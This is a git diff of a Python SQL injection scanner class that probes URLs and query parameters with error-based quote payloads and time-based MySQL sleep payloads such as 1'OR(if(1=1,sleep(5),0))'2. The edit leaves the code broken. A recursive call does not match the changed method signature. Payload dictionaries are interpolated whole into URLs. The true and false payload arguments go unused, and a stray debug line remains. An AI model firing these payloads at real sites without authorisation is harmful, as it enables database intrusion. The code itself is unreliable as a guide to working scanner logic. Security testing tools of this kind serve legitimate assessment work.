@@ -13,7 +13,8 @@ class SqliManager:
         self.cookies = cookies
         self.headers = headers
         self.error_based_payloads = ['\'', '\\', '"', '%27', '%5C']
-        self.time_based_payload = 'XOR(if(1=1,sleep(5),0))'
+        self.time_based_payloads = [{'TruePld':'1\'OR(if(1=1,sleep(5),0))\'2', 'FalsePld':'1\'OR(if(1=2,sleep(5),0))\'2'},
+                                    {'TruePld': '1\'OR(if(1=1,sleep(5),0))--%20', 'FalsePld': '1\'OR(if(1=2,sleep(5),0))--%20'}]
         self.delay_in_seconds = 5
 
     def check_get_requests(self, dtos: List[GetRequestDTO]):
@@ -23,6 +24,7 @@ class SqliManager:
         result = cache_manager.get_saved_result()
 
         if result is None:
+            dtos = list(filter(lambda x: 'route' in x.link, dtos))
             result: List[SqliFoundDTO] = []
             for dto in dtos:
                 self.check_url(dto, result)
@@ -36,15 +38,15 @@ class SqliManager:
 
         parsed = urlparse.urlparse(dto.link)
         base_url = f'{parsed.scheme}://{parsed.hostname}{parsed.path}/'
-
+        if 'route' in base_url:
+            a = 1
         for payload in self.error_based_payloads:
-            url = base_url + payload
-            self.__send_error_based_request(url, result)
+            self.__send_error_based_request(f'{base_url}{payload}', result)
 
-        time_based_payload = f'{base_url}{self.time_based_payload}'
-        self.__send_time_based_request(time_based_payload, result)
+        for payloads in self.time_based_payloads:
+            self.__send_time_based_request(base_url, payloads['TruePld'], payloads['FalsePld'], result)
 
-    def check_get_params(self, dto: GetRequestDTO,  result: List[SqliFoundDTO]):
+    def check_get_params(self, dto: GetRequestDTO, result: List[SqliFoundDTO]):
         error_based_payloads_urls = set()
         time_based_payloads_urls = set()
         parsed = urlparse.urlparse(dto.link)
@@ -53,10 +55,10 @@ class SqliManager:
         for query in queries:
             param_split = query.split('=')
             main_url_split = dto.link.split(query)
-            time_based_payloads_urls.add(
-                main_url_split[0] + param_split[0] + '=' + self.time_based_payload + main_url_split[1])
+            for payload in self.time_based_payloads:
+                time_based_payloads_urls.add(f'{main_url_split[0]}{param_split[0]}={payload}{main_url_split[1]}')
             for payload in self.error_based_payloads:
-                error_based_payloads_urls.add(main_url_split[0] + param_split[0] + '=' + payload + main_url_split[1])
+                error_based_payloads_urls.add(f'{main_url_split[0]}{param_split[0]}={payload}{main_url_split[1]}')
 
         for payload in error_based_payloads_urls:
             self.__send_error_based_request(payload, result)
@@ -77,18 +79,13 @@ class SqliManager:
             print(inst)
             print("ERROR - " + url)
 
-    def __send_time_based_request(self, url, result: List[SqliFoundDTO], attempt: int = 0):
-
-        if attempt >= 3:
-            return result.append(SqliFoundDTO(url, SqliType.TIME, result))
+    def __send_time_based_request(self, url, truePayload, falsePayload, result: List[SqliFoundDTO]):
 
         try:
             response = requests.get(url, headers=self.headers, cookies=self.cookies)
-            if (response.status_code == 200 or str(response.status_code)[0] == '5') \
-                    and (response.elapsed.total_seconds() >= self.delay_in_seconds and attempt == 1):
-                print(f"SQLiManager delay FOUND (status-{response.status_code}, attempt-{attempt}): - " + url)
-                attempt += 1
-                self.__send_time_based_request(url, result, attempt)
+            if response.elapsed.total_seconds() >= self.delay_in_seconds:
+                print(f"SQLiManager delay FOUND (status-{response.status_code}): - " + url)
+                self.__send_time_based_request(url, result)
         except Exception as inst:
             print(inst)
             print("ERROR - " + url)
